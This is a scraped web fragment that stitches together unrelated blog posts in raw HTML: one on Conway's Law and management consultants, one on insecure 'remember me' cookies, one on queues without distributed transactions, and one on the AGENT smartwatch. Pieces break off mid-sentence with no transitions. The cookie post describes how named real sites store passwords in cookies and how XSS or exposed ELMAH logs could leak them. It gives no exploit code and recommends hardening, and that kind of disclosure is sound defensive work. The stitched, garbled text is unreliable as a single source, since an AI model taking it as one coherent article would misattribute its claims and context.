href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.libsyn.com\">LibSyn</a>for your hosting and publishing your podcasts. If you are more technical you can certainly use Amazon S3, Azure Blobs or just your own existing host if you like. For shows like Hanselminutes that have almost 30,000 megabytes of shows, we use S3.

Yet, in most organizations, it is very hard for these ideas to get traction.</p><p>I’ve heard from countless developers and architects over the years about their frustration in getting everybody else to go along with them. “Can’t they see how much better [new approach] is over what we’re doing now?!” they ask, believing that things could and actually would be evaluated on their merits, especially in a rational field like IT.</p><p>The usual explanation I give has a couple of parts.</p><h3>Conway’s Law</h3><p>In 1968 Melvin Conway penned what later became known as <a href=\"http://en.wikipedia.org/wiki/Conway's_law\">Conway’s Law</a> which stated:</p><blockquote><p>“organizations which design systems … are constrained to produce designs which are copies of the communication structures of these organizations.”</p></blockquote><p>An important corollary of that law is that if you wish to have a significant impact on the design of a system, you would need to have a similarly significant impact on the communication structure of the organization making that system.</p><p>The main problem is that the people that tend to be pushing for DDD, IoC, CQRS, SOA, etc are usually not as strong when it comes to the soft skills that are so necessary for bringing about organizational change. The thing is that, at a minimum, these types of changes take 3 to 5 years so it really takes a long-term commitment, both from the individual and the organization.</p><h3>On the rationality of people in IT</h3><p>First of all, people are a whole lot less rational than they’d like to believe – or that they’d like other people to notice. In fact, people will go to great lengths to maintain the appearance of consistency and rationality, even at the cost of harm to themselves. How’s that for irrational?</p><p>Don’t take my word for it – there’s a great book on the topic: <a href=\"http://www.amazon.com/gp/product/0061353248/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=0061353248&linkCode=as2&tag=thesoftwaresi-20\">Predictably Irrational: The Hidden Forces That Shape Our Decisions</a>. The somewhat scary thing about it is that not only are we irrational beings, but that that irrationality can be predicted and, yes, even manipulated.</p><p>Once you can understand that the people you’re trying to convince aren’t Vulcan, you have a much better chance of being effective. I’d say that, for myself, understanding my own modes of irrationality increased my effectiveness as well, and made me quite a bit happier in life too.</p><h3>Why you need to bring in a consultant</h3><p>This isn’t me hawking my wares – believe me, I’m busy enough as it is, but let me know when this starts to sound familiar to you.</p><p>There’s a problem in your organization – could be that you’re not delivering software fast enough, high enough quality, whatever. Suffice it to say that Management isn’t happy. You’ve been living this pain for a while and know exactly what the source of the problem is (more often than not, management has at least a hand if not a whole arm in it). You come up with some recommendations, bring them to the higher-ups, but ultimately are ignored, dismissed, or don’t even get into the room.</p><p>Some time later, management brings in a Consultant (that’s right, with a capital ‘C’) who is there to figure out what’s wrong and come up with recommendations. In some cases, especially in larger organizations, they bring in a whole bunch of them from a brand name like McKinsey or Ernst & Young.</p><p>If these guys are smart, they listen to you, ultimately presenting your analysis and recommendations to management. Of course, those higher-ups are in awe of how quickly these guys were able to understand the inner workings of their organization. That awe lends instant credibility to their recommendations which are then adopted and given powerful political backing.</p><p>And you’re sitting there thinking, “but… but… but that’s what I was saying!!”.</p><p>It’s not the message – it’s the messenger. </p><p>Let me put it another way, explained from the perspective of management – we’re having problems, you work here, ergo you’re part of the problem. Also, you don’t make that much money (compared to management), so how smart could you be? Those brand-name consultants, well, they cost a LOT, so they MUST be good (good enough to know not to work here too).</p><p>Therefore the more the consultant costs, the more likely management is to listen, which ultimately creates the conditions for success, which makes the change happen, which proves to management that they were right to bring in an expensive consultant. A vicious (or virtuous) cycle – depending on how you look at it.</p><p>Now, it doesn’t always work this way, but it does often enough to perpetuate management’s world view.</p><h3>In Closing</h3><p>I do hope your organization and its leaders aren’t trapped in this kind of dysfunction, but if they are, know that you’re not alone and that you can get help – either via consulting or in some books:</p><p>Some good books include <a href=\"http://www.amazon.com/gp/product/1400064287/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=1400064287&linkCode=as2&tag=thesoftwaresi-20\">Made to Stick: Why Some Ideas Survive and Others Die</a> and the grandfather of the field: <a href=\"http://www.amazon.com/gp/product/0671027034/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=0671027034&linkCode=as2&tag=thesoftwaresi-20\">How to Win Friends & Influence People</a>. There are countless others and there isn’t any right place to start – the most important thing to do is to start.</p><p>It’s been over 40 years since Melvin Conway’s observation and, as an industry, we’re still relearning these things – usually through the school of hard knocks. But there is an upside here – I’m pretty sure that, knowing these patterns, you could pick up on some signals during the interviewing process and find a company that’s outgrown many of these issues – one that would be able to have more meritocratic discussions on technical choices.</p><p>In the worst case, you could become a consultant and make a living off of all this irrationality <img src='http://www.udidahan.com/wp-includes/images/smilies/icon_smile.gif' alt=':-)' class='wp-smiley' /> </p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?d=yIl2AUoC8zA\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=r7RJeHsf8vY:98R7fznl1zo:F7zBnMyn0Lo\" border=\"0\"></img></a> <a href=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?a=r7RJeHsf8vY:98R7fznl1zo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/UdiDahan-TheSoftwareSimplist?i=r7RJeHsf8vY:98R7fznl1zo:V_sGLiPBpWU\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/UdiDahan-TheSoftwareSimplist/~4/r7RJeHsf8vY\" height=\"1\" width=\"1\"/>","author":"udidahan","_id":{"$wrap":"$oid","v":1159}}

Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of cryptographic… hang on – that’s Base64 encoding! The thing about Base64 encoding is that it’s neatly complemented by Base64<em>de</em>coding which means that you can head off to somewhere like<a href=\"http://www.base64decode.org\">base64decode.org</a>and do this:</p><p><img width=\"514\" height=\"313\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Base 64 decoding the Black& Decker cookie\" src=\"http://lh3.ggpht.com/-aQZzH2NHr6c/UdFGASLoJQI/AAAAAAAAFcE/bxNThlU8CnQ/image8.png?imgmax=800\" border=\"0\"></p><p>Now not everyone uses Base64 as a means of “cryptography” (yes,<a href=\"http://www.troyhunt.com/2013/01/the-problem-with-website-security-is-us.html\">some people do genuinely do this</a>) and indeed it’s a perfectly legitimate means of representing data in an ASCII format, the real story here however is that this is my password sitting there in my browser in plain text. You may wonder – why is this a problem? It’s in your own browser, right? How does an attacker get it?</p><p>I’m going to talk about two very easy ways and the first relates to the earlier link about insecurity being easy. Black& Decker had exposed ELMAH logs and in those logs was every unhandled internal server exception, somewhere north of 50,000 of them at the time I reported it to them. When ELMAH logs an exception it also logs all the request headers which means the<em>cookies</em>are logged. Combine that with the huge number of unhandled exceptions being thrown by the system and now you have a treasure trove of user credentials. Yes, they should have secured their ELMAH log properly to begin with but it’s a good example of how you can be very easily undone by one very simple misconfiguration.</p><p>Here’s another one:</p><p><img width=\"250\" height=\"378\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Aussie Farmers Direct\" src=\"http://lh3.ggpht.com/-0MQkqGmrVW8/UdFGBK_Z0QI/AAAAAAAAFcM/7HqbqOyYEEM/image311.png?imgmax=800\" border=\"0\"></p><p>This is<a href=\"https://orders.aussiefarmers.com.au\">Aussie Farmers Direct</a>and it’s a fairly typical looking log in form. Let’s log in, tell it to “remember me” then take a look at the cookies:</p><p><img width=\"796\" height=\"139\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Aussie Farmers Direct cookies\" src=\"http://lh5.ggpht.com/-5OyfmaliDfc/UdFGB70cl0I/AAAAAAAAFcU/kFUtgoBKXrk/image91.png?imgmax=800\" border=\"0\"></p><p>Oh dear, same deal again but without any Base64 encoding. Actually this one is particularly bad because you can do stuff like this:</p><p><img width=\"476\" height=\"37\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Improperly encoded cookie on Aussie Farmers Direct\" src=\"http://lh5.ggpht.com/-HMSOuv66vcg/UdFGCsHlkYI/AAAAAAAAFcc/0emkrm4pDqQ/image18.png?imgmax=800\" border=\"0\"></p><p>XSS your own JSON cookie? Sure! The other idiosyncrasy is that changing your password doesn’t change the cookie so you come back to the site later on and it tries to log you in with the old one. Oops.</p><p>Aussie Farmers Direct doesn’t have exposed ELMAH logs (being PHP kind of helps with that!) but they do have other risks such as XSS (incidentally, this has been responsibly disclosed and the risk summarily dismissed – multiple times). The other thing about both the sites above is that those cookies holding the passwords aren’t flagged as HttpOnly, you can see this in the second column from the right in the cookie lists. What this means is that client script can access those cookies which means that if you can get a piece of XSS onto the site – just as you can on the Aussie Farmers site – you can steal cookies containing passwords if you can get a customer to load the XSS payload (and there are numerous ways of doing that). The missing HttpOnly attribute is sloppy on behalf of both sites, but the core of the issue is storing passwords in cookies which then makes them vulnerable via other oversights.</p><p>There’s one more fundamentally important reason why both these practices are negligent; they’re protecting customers’ credentials used on other sites. Every time a customer using the “remember me” feature on one of the sites above makes a request, there’s a very good chance they’re sending the username and password to their email, their eBay or their bank across the wire, sometimes in plain text, sometimes accessible via client script, always sitting there unprotected in the browser.<a href=\"http://www.troyhunt.com/2012/07/what-do-sony-and-yahoo-have-in-common.html\">Password reuse is rampant</a>and whilst those damn users should take some bloody responsibility (I’m paraphrasing here!), we – as developers –<em>must</em>acknowledge that we’re protecting far more than just our own site when we handle credentials.</p><p>So that should establish that there is a genuine misunderstanding of how the “remember me” feature<em>should</em>be built, let’s now move onto the good practices.</p><h4>A sample reference implementation</h4><p>One of the mantras you frequently hear in the security world is “Don’t roll your own – use what’s already been proven to be robust”. This is very frequently applied to encryption and authentication schemes but in this case we can extend this to the “remember me” feature in order to start with a good reference implementation before we delve into the details.</p><p>In a new ASP.NET MVC 4 website provisioned with Visual Studio 2012 you get this right out of the box:</p><p><img width=\"352\" height=\"338\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to a sample ASP.NET application\" src=\"http://lh3.ggpht.com/-T6wJXCWtnpQ/UdFGDJgd8iI/AAAAAAAAFck/vaA2S0PkYic/image31%25255B1%25255D.png?imgmax=800\" border=\"0\"></p><p>Other frameworks have other standard modes of implementing this feature but this is an easy one for me to refer to. When we login with the fields as above (i.e. not asking it to remember me), successful authentication results in the following cookie being returned:</p><pre>Set-Cookie:.ASPXAUTH=6891A5EAF17A9C35B51C4ED3C473FBA294187C97B758880F9A56E3D335E2F020B86A85E1D0074BDAB2E1C9DBE590AF67895C0F989BA137E292035A3093A702DEC9D0D8089E1D007089F75A77D1B2A79CAA800E8F62D3D807CBB86779DB52F012; path=/; HttpOnly</pre><p>This is simply an auth cookie and in the stateless world that is HTTP it’s the one little piece of data that ties all the otherwise entirely independent requests from one person together. Each time this unique-to-me cookie is sent, the website knows it’s me and that I’ve already authenticated. We can see it bit more clearly when we look at it in Chrome’s Cookies collection:</p><p><img width=\"794\" height=\"56\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application without the\"remember me\" box checked\" src=\"http://lh3.ggpht.com/-8rKwUf_wQtk/UdFGDifnEmI/AAAAAAAAFcs/HrHn4wNix-s/image6.png?imgmax=800\" border=\"0\"></p><p>Incidentally, the second cookie is an anti-forgery token to prevent CSRF attacks and has nothing to do with our authenticated state. Other than that, there are no other cookies.</p><p>Let’s now log in and ask the site to remember me, here’s the cookie response:</p><pre>Set-Cookie:.ASPXAUTH=3A92DAC7EFF4EE5B2027A13DD8ABEA8254F0A16D8059FCAF60F5533F1B7D99462DDF57320D069A493481978750526DF952D5C9EA0371C84F5CF1BFC0CCA024C2052824D4BA09670A42B85AEC7FFCB4088FC744C6C0A22749F07AF6E65E674A4A; expires=Tue, 02-Jul-2013 00:27:05 GMT; path=/; HttpOnly</pre><p>Aha – you see that?! It becomes clearer when you see it broken down in Chrome:</p><p><img width=\"794\" height=\"55\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Cookies from a sample ASP.NET application with the\"remember me\" box checked\" src=\"http://lh5.ggpht.com/-BunTDUP-fbA/UdFGELSz1cI/AAAAAAAAFc0/NobvT62lNJA/image9.png?imgmax=800\" border=\"0\"></p><p>We now have a cookie expiration which is 48 hours from now as opposed to having no cookie expiration which means it will be discarded when the browser is closed. Let’s take a closer look at that.</p><h4>Looking at auth cookie expiration</h4><p>This is actually a ridiculously easy security construct and it’s only in light of the earlier examples that I’d even think it worth writing about, but here we are. In this implementation, the “remember me” feature simply boils down to when the auth cookie expires because what you’re really doing here is controlling how long you want someone to stay logged on for, it’s that simple.</p><p>In the example above, ASP.NET defaults to using a session cookie or in other words, a cookie that does not have an explicit expiration date and will therefore forcibly expire when the browser is closed. That’s one approach, another is to explicitly set a short expiration period so that even if the browser is left open the user will be automatically logged out after a period of time. Of course you can also control this behaviour on the server and you can also keep extending the lifetime of an auth cookie if the system is being actively used by the server increasing the expiration date on response.</p><p>Remembering someone can be as simple as keeping that auth cookie alive. How long should it be kept alive for? The example above defaults to two days which is probably a bit short for many legitimate uses of the feature (although it’s easily configurable in ASP.NET), try Facebook though and you’ll get cookies that last for a year. Shorter duration means less risk but more inconvenience, longer duration makes it easier for the user but increases the window of potential attack. Let’s take a look at that risk in more detail.</p><h4>Exploiting long-running authentication state</h4><p>While you are not authenticated, your session can’t be hijacked. I know, insightful stuff! But seriously, take a case like Aussie Farmers Direct above; that cookie will expire in six months and combined with the fact that it’s not flagged as HTTP only and that they have XSS flaws in the site there’s now half a year window where just following a link could cause me to inadvertently hand over my credentials to an attacker. If that period was, say, one month yes, they’d still have some serious flaws in their design but then the window of opportunity for an attacker has just been slashed.</p><p>On the other hand, Black& Decker has a relative short one week expiration period so in their case with the exposed ELMAH logs, yes, there was a series of bad failures on their part but unless someone had logged in with the “remember me” box ticked in the last week<em>and</em>caused an unhandled exception, the credentials wouldn’t be put on public display. Ok, if you’re on the site to begin with there’s a good chance you’re already logged in (at least compared to the Farmers example where you wouldn’t have to consciously go anywhere near the site to lose your password) but you can see how that risk profile changes with the cookie expiration period.</p><p>Of course underlying all this is that the auth cookie needs to be carefully protected; HttpOnly and secure attributes are an absolute must. All your classic hijacking threats remain relevant but then again, however you slice and dice this feature you’re going to end up with a cookie dependency therefore you’re going to need to watch those cookies very, very carefully.</p><p>Ultimately it’s a trade-off that needs to consider factors such as the value to an attacker of the user’s data on the site, the barrier that<em>not</em>being authenticated poses to a returning user and the security profile of the rest of the site. For example, Facebook has some very useful data of a social nature and users expect a low-friction (even<em>no</em>-friction) process when returning, plus they’ve made<em>massive</em>investments in their security profile. Aussie Farmer’s, on the other hand, holds personally identifiable user data plus financial info whilst providing a service that people<em>expect</em>to authenticate to (payment facilities) yet have little understanding of important security concepts. They’re very different risk profiles and they<em>should</em>be very different auth cookie expiration strategies.</p><h4>Strengthening the approach</h4><p>There will be folks who look at the auth cookie approach and roll their eyes in despair. The thing about security is that there’s always a better way depending on the time / money / complexity you’re willing to add and there’s also always someone ready to tell you you’ve got it wrong! Using the auth cookie expiration as a starting point, let’s look at some possible ways of strengthening the approach.</p><p>One argument against long expiration of auth cookies is that they’re effectively keeping the user authenticated and at risk of attacks such as CSRF or clickjacking. Of course the application needs to exhibit other risks in order for an attacker to capitalise on the long lasting cookie but the whole defence in depth argument comes up again. An alternative is to have a dedicated cookie keyed against the user which after validating the authenticity of it with the server, can then initiate a new authenticated session on their return. The original session can then expire quickly, the trick is to re-instate a new one when the user comes back with the dedicated “remember me” cookie and include some additional validation in the process.</p><p>One way of providing additional validation is by including the user’s IP address / user agent / other distinguishing feature in the “remember me” cookie. The rationale is that this offers some defence against hijacking of the cookie. The problem, of course, is that there are legitimate use cases where these change. In the mobile world in particular it’s not uncommon to return to a site with a different IP. Even in the world of physical connections you can’t necessarily rely on the ISP providing a static IP address. As for user agents, with browsers like Chrome and Firefox updating at what seems like every other day, unless you’re a bit selective about<em>what</em>attributes of the user agent string you’re storing and comparing that’s going to be a risky approach. The same defences around using unique user attributes to and add security are often discussed in the context of session and auth cookies and whilst I’m sure there are valid use cases for this (back to banking again), I can’t say I’ve actually seen it in place in any of the sites I’ve tested before. There’s probably a good reason for that…</p><p>A more pragmatic mitigation is to still separate the auth cookie from a dedicated “remember me” cookie and use the latter to re-authenticate the user<em>but impose some restrictions</em>. The reality is that the process of automatically persisting someone’s authenticated state – through whatever means – introduces compromises to the security model. A mitigation would be to require an automatically re-authenticated user to expressly provide their credentials again before viewing certain classes of data or performing certain activities. This is not unheard of even outside the scope of “remember me”, you might see it when performing high-value activities such as a bank transfer. In this case, we’re saying that the authenticated user is at greater risk because there’s more likelihood that they’re not who they say they are (i.e. someone else has sat down at the PC and effectively highjacked a session).</p><p>The other hardening we can apply to this approach is to ensure that the cookie used to remember the user is reset after it has been used. This also means invalidating it on the server side so there needs to be both uniqueness and persistence of the cookie value, for example a nonce persisted in both the database and the cookie. This has the benefit of ensuring that if the cookie<em>is</em>obtained by an attacker it has only has a single use scope – and that’s if the user can’t legitimately use it before them. There’s a good little article<a href=\"http://jaspan.com/improved_persistent_login_cookie_best_practice\">here</a>which talks about some mitigations to this pattern and again, there are use cases where this can be beneficial but you are going to invest additional effort building it and there are cases where it will inconvenience legitimate users (i.e. trying to remember yourself on the same site across multiple PCs).</p><p>The last thing worth mentioning is that the same account management principles that need to be considered for active authenticated sessions are relevant in the “remember me” context. For example, are multiple simultaneously authenticated sessions allowed from the one user? If the user changes their password will it disconnect the other sessions? Can an administrator end the authenticated session? There are all sorts of issues that come up that are<em>really</em>part of the discussion on how authenticated sessions are verified and managed, the discussion here is merely about how to reinstate that.</p><h4>When shouldn’t you allow “remember me”? (and some middle-ground alternatives)</h4><p>Sometimes it simply<em>never</em>makes sense to allow an authenticated user to remain authenticated for long periods of time. Banking, for example, is the stereotypical use case for when you want to force re-authentication as soon as possible as the risks are just too significant to leave unused authenticated browser sessions lying around the place.</p><p>But there is actually some middle ground that can be taken here:</p><p><img width=\"240\" height=\"278\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A\"remember me\" box on the American Express website\" src=\"http://lh4.ggpht.com/-utZn1CP4eZM/UdFGEmoMc9I/AAAAAAAAFc8/Lh20wkoe09Y/image12.png?imgmax=800\" border=\"0\"></p><p>This is not entirely what it looks like – when you come back after an expired session where you asked the site to “Remember Me”, you’ll get this:</p><p><img width=\"241\" height=\"280\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"The American Express website pre-populating the username on return\" src=\"http://lh6.ggpht.com/-4s1S1UF2cYQ/UdFGFMBkHXI/AAAAAAAAFdE/4NdTjBkR_rM/image15.png?imgmax=800\" border=\"0\"></p><p>I’ve not obfuscated the username, the username as it appears above with the stars are stored in a cookie that lasts for three months along with some other data that inevitably identifies the user. Frankly, I don’t see a lot of value in this, remembering your username isn’t usually the problem!</p><p>But it also doesn’t have to be all or nothing, there’s middle ground. For example, the point I made earlier about re-authenticating before key processes are performed if the session had been resumed by a “remember me” feature. It’s a bit of the best of both worlds.</p><h4>In conclusion…</h4><p>This is one of those features that seems like a good idea at the time (and<em>sometimes</em>it is) and it’s usually very easy to get right, at least<em>sufficiently</em>right for most purposes. Frankly, it’s still a little baffling how wrong the two earlier examples got it particularly when you consider that it would have been sufficient to just extend the lifetime of the cookie they already have!</p><p>The other point to take away from this post beyond just the mechanics of the “remember me” feature is how security is such a multi-tiered, inter-dependent beast. You might be able to get away with credentials in cookies by themselves, but combine that with the ELMAH situation or missing HTTP only attributes and XSS flaws and suddenly a foolish albeit relatively innocuous practice becomes a serious risk.

I’m talking specifically about the ability to enlist a queue in a distributed transaction here.</p><p>I think the reason for this interest is the rise in popularity of cloud platforms and queuing systems like RabbitMQ (which don’t support distributed transactions) and the difficulty of setting up distributed transactions even in on-premise.</p><p>Of course, there’s also the regular scalability hand-wringing going on even though most people wouldn’t bump up against those limits anyway.</p><p>In this post, I’ll talk about the nature of the problem, explain the pitfalls in some of the common solutions, but I’ll put off the description of how to provide consistency without distributed transactions to a future post as this one is already going to be quite long.</p><p>I’ll start with the basic fault-tolerance issues and then explain how things spiral out from there.</p><h3>Starting with the basics</h3><p>OK, so we have a queuing system in place that dispatches messages to our business logic which does some transactional work against a database.</p><p>Let’s say that we completed the transaction against our database but before we could acknowledge to the queue that the message was processed successfully, our machine crashed. What our machine comes up again, the queue will once again dispatch us the same message. Unless we have some logic to detect that we’ve already processed it (called “idempotence” in the REST community), we will end up processing it again.</p><p>In short, the problem is duplicates.</p><h3>Attempted solutions to the duplicate problem</h3><p>Most queuing systems don’t do anything about duplicates, actually giving it a proper architectural name: At-least-once message delivery, as opposed to the Once-and-only-once model that a queue that supports distributed transaction provides.</p><p>The solution often suggested is to have your logic check to see if it has already processed a message with that ID before – in essence storing the ID of each message processed for some period of time. Of course, there is some performance overhead with that, but it might be a small price to pay compared to dealing with it in the logic of every use case.</p><p>On the other hand, you’ll often have some messages (like Update commands) for which it looks like you can safely process them multiple times, in which case you might want not to pay the performance overhead there. The thing is, if your logic publishes an event in addition to the regular database work (something that is quite common) and you process the same message twice, you will probably end up publishing the event twice as well. </p><p>These duplicates are different in that here we have two distinct messages with different IDs that contain the same business data. This means that recipients of these messages will not be able to filter them out at an infrastructure level anymore.</p><h3>NOTE: Deduplication abilities in queues</h3><p>Although the Azure Service Bus doesn’t support distributed transactions meaning you still have the issue mentioned above, Microsoft added the ability to detect and filter out duplicates based on message contents rather than just the ID. This helps quite a bit but it’s important to understand that that doesn’t cover everything for you. Let me explain:</p><h3>More complex logic</h3><p>In some of your most important use cases, you may have both entity updates as well as entity creation happening together in your domain model. You might be using some kind of event model (like I wrote about <a href=\"http://www.udidahan.com/2009/06/14/domain-events-salvation/\">here</a>) to percolate out the information that an entity was created in order to keep your service layer decoupled from the internals of the domain model.</p><p>In the callback code from these domain events, you will likely publish out an event on the queuing system containing information like the ID of the entities created as well as other business data. And there’s the rub.</p><p>You see, without distributed transactions, you can run into some problematic scenarios:</p><p>For example, if you don’t make sure that your event publishing calls to the queuing system include the same transaction object as the one you used when retrieving the original message from the queue, then those calls could “escape” before you know if the database transaction is going to succeed. Deadlocks always happen at the lousiest times. Anyway, if you’re using database generated IDs for your entities, then those IDs will get published out in events despite the database rolling back and your subscribers will now be making decisions on <b><i>wrong</i></b> data – not just eventually consistent data.</p><p>In this case, processing the message again doesn’t really solve the problem – it just means that you’ll be publishing events with different IDs, so an infrastructure like Azure Service Bus couldn’t really de-duplicate them.</p><p>On the other hand, if you do use the same transaction and combine in the infrastructural message ID based de-duplication described above (as identifying duplicate calls for complex business logic is damn hard), you’ll run into another problem. </p><p>Consider what would happen if your server crashes right after finishing its database work but before it completes the transaction against the queuing system. When going to retry the message, the infrastructure filtering thing would know not to call your business logic again and that message would be quietly swallowed. Unfortunately, the event publishing calls to the queuing system from the first time the message was processed were rolled back and since your business logic isn’t called again, the event publishing won’t happen again.</p><p>Oops.</p><h3>In closing</h3><p>I hope I’ve been able to clarify what kind of scenarios distributed transactions solve for you and some of the difficulties in solving them yourself.</p><p>Now, to be clear, you could solve these problems by going in-depth on each of your use cases, analyzing the consistency needs and structuring the code differently to address those needs. But give this another thought, if our consistency is dependent on calling otherwise independent APIs in exactly the right order, and that a change in this order would not cause any visible functional effects, what would happen when developers with less expertise maintain this code?</p><p>The folks in the event sourcing community have their solution to this which is based on writing their business logic differently.

Secret Labs are the folks that brought us the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~https://www.google.com/webhp?sourceid=chrome-instant&ion=1&ie=UTF-8#gs_rn=17&gs_ri=psy-ab&tok=aZWoF7UPlLj6_NK-gREr5A&suggest=p&cp=8&gs_id=4x&xhr=t&q=Netduino&es_nrs=true&pf=p&output=search&sclient=psy-ab&oq=Netduino&gs_l=&pbx=1&bav=on.2,or.r_cp.r_qf.&bvm=bv.48137252,d.cGE&fp=c27102543d04f20&biw=0&bih=471&ion=1&bs=1\">Netduino</a>open source electronics platform that uses the .NET Micro Framework.

We'll be speaking about developing for embedded systems and the AGENT Watch with C#. What are the power considerations? How low-level is this kind of coding? Can one kind of app cause battery drain while another keeps the watch going for a week? What about notifications and bluetooth? We'll cover all this and lots more, join us.</p></blockquote><p><img title=\"The AGENT Smart Watch will talk to your phone\"style=\"float: right; display: inline\"alt=\"The AGENT Smart Watch will talk to your phone\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/d077ee7030305ec8e20d8b32fc3d221c_large_3.jpg\"width=\"320\"height=\"301\"/>The AGENT Smart Watch was trying to raise $100k to build a watch and as of the time of this writing they are<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.kickstarter.com/projects/secretlabs/agent-the-worlds-smartest-watch\">within spitting distance of a MILLION dollars</a>! There's just hours to go to get in on this cool Kickstarter. (Remember, Kickstarter is an investment, not a store.)</p><p>Not only is this a .NET Microframework Device, but we can start writing apps now using the AGENT Watch Emulator. From their Kickstarter site:</p><blockquote><p>Traditional smartwatches run apps in an unrestricted environment.  AGENT's OS includes a managed runtime, optimized for our low-power architecture.  It is called the .NET Micro Framework and it makes watch apps trustable.</p><p>This feature-rich managed runtime also offers developers modern features they crave: event-based programming; multi-threading; garbage collection; lambda expressions; exception handling; automatic power management; and much more.</p></blockquote><p>You can install VS2012 and the<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~netmf.codeplex.com/releases/view/81000\">.NET Micro Framework 4.3</a>and write an app for your wrist! I alluded to this a little in my Xamarin talk\"<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.hanselman.com/blog/XamarinEvolve2013TalkVideoHowCSavedMyMarriage.aspx\">How C# Saved My Marriage</a>.\" You can write .NET apps for embedded systems, a watch, tablets, desktops, web sites, large cloud systems and more.</p><blockquote><p><strong>Full disclosure:</strong>I have no financial stake or business relationship with SecretLabs, but we are friends and I'm a fan. I helped Chris with some copy writing on the Kickstarter page, its text and reviewing the video as a favor. I have received no money from SecretLabs and I backed the Kickstarter with my own money.</p></blockquote><p><strong><img title=\"image\"style=\"float: right; display: inline\"alt=\"image\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_3.png\"width=\"251\"height=\"231\"/></strong>I got a preview of the<strong>AGENT Smart Watch emulator</strong>, and some code from Kickstarter backer<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~dk.linkedin.com/in/ebast\">Esben Bast</a>who created a binary clock face. I loaded up VS2012 and the binary clock emulator. This initial code is just about 100 lines. You can see the references in Solution Explorer here. SPOT means\"Smart Personal Object Technlogy.\"</p><p>The fact that there is an emulator is huge. No worries about breaking a watch or even having a watch! The Agent Watch SDK puts a reference to the AGENT Emulator in my registry, so it shows up directly in Visual Studio:</p><p><img title=\"image\"style=\"display: inline\"alt=\"image\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/Exclusive-Sneak-Peak-The-Agent-.NET-code_F31F/image_8.png\"width=\"319\"height=\"217\"/></p><p>Then I can debug my watch app without a watch, just as if I were writing a Phone App or Web Site. It's a first class experience inside of VS. This makes me feel particularly empowered as a .NET developer because it means<em>I already know how to write apps for this watch</em>and I've never even seen it before..</p><p><img src=\"http://hanselman.com/blog/content/binary/agentsmartwatchanimation.gif\"/></p><p>The code is pretty straightforward, if appropriately low-level. This IS a small device 